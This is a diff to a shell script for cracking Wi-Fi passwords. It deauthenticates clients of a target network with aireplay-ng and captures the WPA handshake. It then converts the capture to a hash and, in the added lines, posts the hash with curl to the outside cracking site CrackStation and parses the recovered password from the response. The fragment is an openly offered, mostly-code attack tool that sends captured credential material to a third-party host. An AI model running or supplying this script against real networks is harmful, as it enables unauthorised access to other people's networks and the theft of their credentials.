@@ -23,8 +23,24 @@ sudo aireplay-ng --deauth 5 -a $(sudo airodump-ng --essid "$network" wlp2s0 | gr
 sudo aircrack-ng -J hash capture*.cap
 sudo hcxpcaptool -z hash.hccapx capture*.cap
 
-# Display the hash
-sudo cat hash.hccapx | xxd -ps
+# Extract the hash
+hash=$(sudo cat hash.hccapx | xxd -ps)
+
+# Submit the hash to CrackStation
+crackstation_url="https://crackstation.net/"
+crackstation_data="hash=$hash&hash_type=wpa-psk"
+
+crackstation_result=$(curl -s -d "$crackstation_data" "$crackstation_url")
+
+# Extract the password from the CrackStation result
+password=$(echo "$crackstation_result" | grep -oP '<em class="password">.*?</em>' | sed -e 's/<em class="password">//g' -e 's/<\/em>//g')
+
+# Display the password, if found
+if [ -z "$password" ]; then
+    echo "Password not found."
+else
+    echo "Password: $password"
+fi
 
 # Clean up
 sudo rm capture*.cap
